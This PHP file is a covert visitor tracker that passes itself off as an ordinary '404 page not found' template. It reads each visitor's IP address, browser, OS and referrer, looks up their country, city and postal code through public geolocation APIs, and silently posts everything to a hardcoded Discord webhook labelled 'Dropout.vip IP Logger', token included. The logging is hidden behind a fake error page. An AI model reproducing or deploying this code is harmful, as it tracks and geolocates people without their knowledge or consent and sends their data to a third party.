<?php
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
function getOS() { 
    global $user_agent;
    $os_platform    =   "Dropout Is Daddy";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'Wannabe Hacker',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}
function getBrowser() {
    global $user_agent;
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozila',
							'/Mozilla/5.0/i'=>	'Mozila',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'Spam',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Dropout Is Daddy'
                        );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}
$user_os        =   getOS();
$user_browser   =   getBrowser();

$ip = $_SERVER['REMOTE_ADDR'];
$site_refer = $_SERVER['HTTP_REFERER'];
	if($site_refer == ""){
		$site = "dirrect connection";
	}
else{
		$site = $site_refer;
	}
date_default_timezone_set('Australia/Sydney');
$time = date('Y-m-d H:i:s');
$url = "https://discord.com/api/webhooks/742632543634980924/GfUG73HMlGBs_S6BmYx7ZNZQvC9WODRTqKIp8lh73pzRP5TopDF6aYH0cMZRmzV3ZsyJ";

$ipdat = @json_decode(file_get_contents( 
    "http://www.geoplugin.net/json.gp?ip=" . $ip)); 

$ipshet = @json_decode(file_get_contents( 
    "http://ip-api.com/json/" . $ip));

$hookObject = json_encode([
    "username" => "IP Logger",
    "avatar_url" => "https://media.discordapp.net/attachments/738744853911044099/738995981538033684/Logo.png?width=421&height=421",
    "tts" => false,
    "embeds" => [
        [
            "title" => "Dropout.vip IP Logger",

            "type" => "rich",

            "description" => "**IP: `$ip`\nDevice: `$user_os`\nBrowser: `$user_browser`\nTime: `$time`\nCountry: `$ipdat->geoplugin_countryName`\nCity: `$ipdat->geoplugin_city`\nContinent: `$ipdat->geoplugin_continentName`\nTimezone: `$ipdat->geoplugin_timezone`\nPostal Code: `$ipshet->zip`**",

            "url" => "https://dropout.vip/",

            "color" => hexdec( "2f3136" ),

            "footer" => [
                "text" => "Dropout",
                "icon_url" => "https://media.discordapp.net/attachments/738744853911044099/738995981538033684/Logo.png?width=421&height=421"
            ],

            "author" => [
                "name" => "Dropout",
                "url" => "https://dropout.vip/"
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>
<? php
echo '<!DOCTYPE html>';
echo '<html lang="en">';
echo '';
echo '<head>';
echo '<meta charset="utf-8">';
echo '<meta http-equiv="X-UA-Compatible" content="IE=edge">';
echo '<meta name="viewport" content="width=device-width, initial-scale=1">';
echo '<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->';
echo '';
echo '<title>404 HTML Template by Colorlib</title>';
echo '';
echo '<!-- Google font -->';
echo '<link href="https://fonts.googleapis.com/css?family=Montserrat:500" rel="stylesheet">';
echo '<link href="https://fonts.googleapis.com/css?family=Titillium+Web:700,900" rel="stylesheet">';
echo '';
echo '<!-- Custom stlylesheet -->';
echo '<link type="text/css" rel="stylesheet" href="css/style.css" />';
echo '';
echo '<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->';
echo '<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->';
echo '<!--[if lt IE 9]>';
echo '<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>';
echo '<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>';
echo '<![endif]-->';
echo '';
echo '</head>';
echo '';
echo '<body>';
echo '';
echo '<div id="notfound">';
echo '<div class="notfound">';
echo '<div class="notfound-404">';
echo '<h1>404</h1>';
echo '</div>';
echo '<h2>Oops! This Page Could Not Be Found</h2>';
echo '<p>Sorry but the page you are looking for does not exist, have been removed. name changed or is temporarily unavailable</p>';
echo '<a href="#">Go To Homepage</a>';
echo '</div>';
echo '</div>';
echo '';
echo '</body><!-- This templates was made by Colorlib (https://colorlib.com) -->';
echo '';
echo '</html>';
echo '';
?>
